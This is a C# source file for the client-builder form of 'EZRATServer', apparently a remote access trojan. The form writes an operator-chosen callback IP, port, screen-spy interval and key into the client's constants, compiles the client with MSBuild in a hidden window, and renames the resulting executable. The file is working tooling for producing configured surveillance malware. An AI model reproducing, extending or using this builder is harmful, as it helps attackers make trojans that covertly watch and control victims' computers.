using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection;
using System.Windows.Forms;

namespace EZRATServer.Forms
{
    public partial class ClientBuilder : Form
    {
        private bool _optionsAdvanced = false;
        private Size _normalSize = new Size(365, 250);
        private Size _advancedSize = new Size(675, 250);

        public bool OptionsAdvanced { get => _optionsAdvanced; set => _optionsAdvanced = value; }

        public ClientBuilder()
        {
            InitializeComponent();
            this.tbxIP.Text = GetLanIp();
            this.btnBuild.Click += Builder;
            this.lblOptions.Click += AdvancedOptions;
            this.btnSearch.Click += SearchingBuild;
            this.btnSearchingClient.Click += SearchingClient;
            this.Size = _normalSize;
        }

        private void SearchingBuild(object sender, EventArgs e)
        {
            OpenFileDialog opf = new OpenFileDialog();
            opf.Multiselect = false;
            opf.Filter = "MSBuild.exe|*.exe";
            opf.Title = "MSBuilder searcher";
            if (opf.ShowDialog() == DialogResult.OK)
            {
                this.tbxBuild.Text = opf.FileName;
            }
        }

        private void SearchingClient(object sender, EventArgs e)
        {
            OpenFileDialog opf = new OpenFileDialog();
            opf.Multiselect = false;
            opf.InitialDirectory = @"..\..\..\..\EZRATClient\";
            opf.Filter = "*.csproj|*.csproj";
            opf.Title = "Client project searcher";
            if (opf.ShowDialog() == DialogResult.OK)
            {
                this.tbxClientProj.Text = opf.FileName;
            }
        }


        private void AdvancedOptions(object sender, EventArgs e)
        {
            if (!OptionsAdvanced)
            {
                this.Size = _advancedSize;
                this.lblOptions.Text = "Options Advanced";
                this.OptionsAdvanced = true;
            }
            else
            {
                this.Size = _normalSize;
                this.lblOptions.Text = "Options";
                this.OptionsAdvanced = false;
            }
        }


        private string GetLanIp()
        {
            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                GatewayIPAddressInformation gatewayAddress = ni.GetIPProperties().GatewayAddresses.FirstOrDefault();
                if (gatewayAddress != null) //exclude virtual physical nic with no default gateway
                {
                    if (ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 ||
                        ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet &&
                        ni.OperationalStatus == OperationalStatus.Up)
                    {
                        foreach (UnicastIPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
                        {
                            if (ip.Address.AddressFamily != AddressFamily.InterNetwork ||
                                ip.AddressPreferredLifetime == UInt32.MaxValue) // exclude virtual network addresses
                                continue;

                            return ip.Address.ToString();
                        }
                    }
                }
            }

            return "-";
        }




        // ..\..\..\..\EZRATClient\*.cs
        private void Builder(object sender, EventArgs e)
        {
            for (int i = 0; i < 2; i++)
            {
                EditConstantesClient();
                Process proc = new Process();
                proc.StartInfo.FileName = this.tbxBuild.Text;
                proc.StartInfo.WorkingDirectory = this.tbxClientProj.Text.Substring(0, this.tbxClientProj.Text.LastIndexOf("\\"));
                proc.StartInfo.Verb = $"/C /property:Configuration=Debug {this.tbxClientProj.Text}";
                proc.StartInfo.UseShellExecute = false;
                proc.StartInfo.CreateNoWindow = true;
                proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                proc.StartInfo.RedirectStandardOutput = true;
                proc.Start();
                while (!proc.StandardOutput.EndOfStream)
                {
                    string line = proc.StandardOutput.ReadLine();
                    Console.WriteLine(line);
                }
                MoveClient();
                ResetConstantesValue();
            }
        }


        private void ResetConstantesValue()
        {
            string fileName = $@"{this.tbxClientProj.Text.Substring(0, this.tbxClientProj.Text.LastIndexOf("\\"))}\Utils\Constantes.cs";
            string text = File.ReadAllText(fileName);
            text = text.Replace($"{this.tbxIP.Text}", "192.168.1.112");
            text = text.Replace($"{this.tbxPort.Text}", "1234");
            if (this.tbxScreenSpy.Text != string.Empty)
                text = text.Replace($"{this.tbxScreenSpy.Text}", "100");
            if (this.tbxImageX.Text != string.Empty)
                text = text.Replace($"({this.tbxImageX.Text},{this.tbxImageY.Text})", "(1280,720)");
            if (this.tbxKey.Text != string.Empty)
                text = text.Replace($"{this.tbxKey.Text}", "POULPE212123542345235");
            File.WriteAllText(fileName, text);
        }

        private void EditConstantesClient()
        {
            string fileName = $@"{this.tbxClientProj.Text.Substring(0, this.tbxClientProj.Text.LastIndexOf("\\"))}\Utils\Constantes.cs";
            string text = File.ReadAllText(fileName);
            text = text.Replace("192.168.1.112", $"{this.tbxIP.Text}");
            text = text.Replace("1234", $"{this.tbxPort.Text}");
            if (this.tbxScreenSpy.Text != string.Empty)
                text = text.Replace("100", $"{this.tbxScreenSpy.Text}");
            if (this.tbxImageX.Text != string.Empty)
                text = text.Replace("(1280,720)", $"({this.tbxImageX.Text},{this.tbxImageY.Text})");
            if (this.tbxKey.Text != string.Empty)
                text = text.Replace("POULPE212123542345235", $"{this.tbxKey.Text}");
            File.WriteAllText(fileName, text);
        }


        private void MoveClient()
        {
            string path = $"{this.tbxClientProj.Text.Substring(0, this.tbxClientProj.Text.LastIndexOf("\\"))}\\bin\\Debug\\EZRATClient.exe";
            if (File.Exists($"{Environment.CurrentDirectory}\\{this.tbxName.Text}"))
            {
                File.Delete($"{Environment.CurrentDirectory}\\{this.tbxName.Text}");
                File.Move(path, $"{Environment.CurrentDirectory}\\{this.tbxName.Text}");
            }
        }

    }
}
